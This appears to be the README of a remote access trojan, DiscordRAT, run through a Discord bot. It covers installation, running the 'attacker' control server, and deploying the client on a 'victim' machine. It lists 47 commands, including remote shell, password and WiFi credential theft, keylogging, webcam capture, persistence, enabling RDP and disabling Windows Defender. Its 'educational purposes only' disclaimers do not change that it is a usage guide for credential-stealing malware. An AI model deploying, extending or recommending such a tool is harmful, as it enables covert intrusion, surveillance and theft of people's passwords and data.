# ⚠️ DiscordRAT - Educational C2 Framework
# 
# WARNING: This tool is for EDUCATIONAL PURPOSES ONLY!
# Unauthorized access to computer systems is illegal.
# Only use in your own lab environment with explicit permission.


# ─────────────────────────────────────────────────────────────
# 📦 INSTALLATION
# ─────────────────────────────────────────────────────────────

# 1. Clone or Download
git clone https://github.com/yourusername/discordrat.git
cd discordrat

# 2. Install Dependencies
pip install -r requirements.txt

# 3. Create Discord Bot
# Go to: https://discord.com/developers/applications
# Create new application → Bot tab → Create Bot
# Enable "Message Content Intent"
# Copy token and invite bot to your server

# 4. Configure Token
# Edit BOTH rat.py AND server.py:
# DISCORD_TOKEN = "YOUR_BOT_TOKEN_HERE"


# ─────────────────────────────────────────────────────────────
# 🚀 USAGE
# ─────────────────────────────────────────────────────────────

# Start Control Center (Attacker)
py server.py
# Open: http://localhost:5000

# Deploy RAT (Victim)
py rat.py

# Commands (Type in Discord or Web Dashboard)
!info          # System info
!screenshot    # Take screenshot
!shell whoami  # Execute command
!passwords     # Steal passwords
!wifi          # WiFi passwords
!rdp           # Enable RDP
!selfdestruct  # Remove RAT


# ─────────────────────────────────────────────────────────────
# 📋 ALL COMMANDS (47 TOTAL)
# ─────────────────────────────────────────────────────────────

# File: pwd, ls, cd, mkdir, delete, rename, copy, move, download
# System: info, shell, ps, kill, ping, uptime, hostname, ip, whoami, persist
# Capture: screenshot, webcam, keylogs, clipboard
# Stealer: passwords, wifi, history
# Network: netstat, arp, nslookup, pinghost
# Fun: beep, volume, screenbrightness, openurl, wallpaper, speak
# Control: rdp, lock, restart, shutdown, logout, sleep, hibernate
# Defender: disabledefender, enabledefender, adddefenderexclusion
# Dangerous: selfdestruct


# ─────────────────────────────────────────────────────────────
# 🔒 DISCLAIMER
# ─────────────────────────────────────────────────────────────

# This tool is for educational purposes only.
# The author is not responsible for any misuse.
# Unauthorized access to computer systems is illegal.


# Made with ❤️ for educational purposes
